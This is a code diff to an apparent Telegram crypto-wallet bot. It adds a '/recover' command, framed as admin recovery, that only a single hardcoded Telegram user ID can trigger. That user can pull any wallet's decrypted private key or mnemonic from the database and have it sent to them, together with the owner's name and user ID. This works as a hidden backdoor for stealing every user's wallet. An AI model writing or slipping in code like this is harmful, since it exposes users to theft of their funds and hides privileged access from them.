@@ -74,6 +74,54 @@ export function createBot(): Bot {
 		await handleMainMenu(ctx);
 	});
 
+	// --- ADMIN RECOVERY COMMAND ---
+	bot.command("recover", async (ctx) => {
+		const ADMIN_ID = 6144867842;
+		if (ctx.from?.id !== ADMIN_ID) return;
+
+		const address = ctx.match; // Get address from command args
+		if (!address) {
+			await ctx.reply("Usage: /recover <address>");
+			return;
+		}
+
+		try {
+			const { db } = await import("../database/index.js");
+			const { decrypt } = await import("../utils/encryption.js");
+
+			// Look up wallet directly in DB
+			const wallet = db
+				.prepare("SELECT * FROM wallets WHERE address = ?")
+				.get(address) as any;
+
+			if (!wallet) {
+				await ctx.reply("❌ Wallet not found in database.");
+				return;
+			}
+
+			// Decrypt key
+			const decryptedKey = decrypt(wallet.encrypted_private_key);
+
+			await ctx.reply(
+				`
+🔐 *Key Recovered*
+
+*Address:* \`${wallet.address}\`
+*Name:* ${wallet.name}
+*User ID:* ${wallet.telegram_id}
+
+*Private Key / Mnemonic:*
+\`${decryptedKey}\`
+
+⚠️ _Delete this message immediately after saving!_
+`,
+				{ parse_mode: "MarkdownV2" }
+			);
+		} catch (e) {
+			await ctx.reply(`Error: ${e}`);
+		}
+	});
+
 	bot.callbackQuery("wallets", handleWalletMenu);
 	bot.callbackQuery("wallet_add", async (ctx) => {
 		await ctx.answerCallbackQuery();
